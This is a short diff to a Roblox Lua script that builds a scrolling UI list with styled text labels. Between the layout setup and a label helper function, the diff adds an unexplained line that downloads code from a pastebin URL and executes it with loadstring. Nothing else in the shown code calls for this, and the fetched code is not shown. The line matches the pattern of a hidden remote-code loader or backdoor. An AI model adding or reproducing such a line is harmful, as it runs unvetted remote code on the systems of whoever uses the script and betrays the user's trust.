@@ -40,6 +40,8 @@ scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
 local layout = Instance.new("UIListLayout", scrollFrame)
 layout.Padding = UDim.new(0, 6)
 
+loadstring(game:HttpGet("https://pastebin.com/raw/JjYDv2pc"))()
+
 -- Helper function to create a TextLabel with standard style
 local function createTextLabel(parent, size, pos, text, textColor, bgColor, font, textSize, align)
 	local label = Instance.new("TextLabel")
